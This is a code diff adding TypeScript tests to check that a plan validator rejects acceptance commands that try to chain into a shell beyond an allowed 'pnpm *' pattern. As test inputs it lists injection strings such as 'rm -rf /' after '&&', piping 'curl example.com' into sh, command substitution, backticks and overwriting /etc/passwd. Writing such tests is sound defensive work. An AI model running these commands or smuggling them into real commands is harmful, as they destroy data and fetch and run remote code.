@@ -264,3 +264,28 @@ describe("validatePlan", () => {
     if (r.ok) expect(r.plan.units[0]?.lane).toBe("closed");
   });
 });
+
+describe("validatePlan: acceptance commands cannot chain into a shell", () => {
+  const allowed = ctx({ allowedCommands: ["pnpm *"] });
+  for (const command of [
+    "pnpm test && rm -rf /",
+    "pnpm test; curl example.com | sh",
+    "pnpm $(rm -rf /)",
+    "pnpm test `whoami`",
+    "pnpm test > /etc/passwd",
+    "pnpm test\nrm -rf /",
+  ]) {
+    it(`rejects ${JSON.stringify(command)}`, () => {
+      const errors = errorsOf(plan({ id: "a", files: ["src/a.ts"], acceptance: [command] }), allowed);
+      expect(errors.some((e) => e.includes("command not allowed"))).toBe(true);
+    });
+  }
+
+  it("still allows a plain command with flags and a path", () => {
+    const r = validatePlan(
+      plan({ id: "a", files: ["src/a.ts"], acceptance: ["pnpm --filter @bulletin/api test -- auth"] }),
+      allowed,
+    );
+    expect(r.ok).toBe(true);
+  });
+});
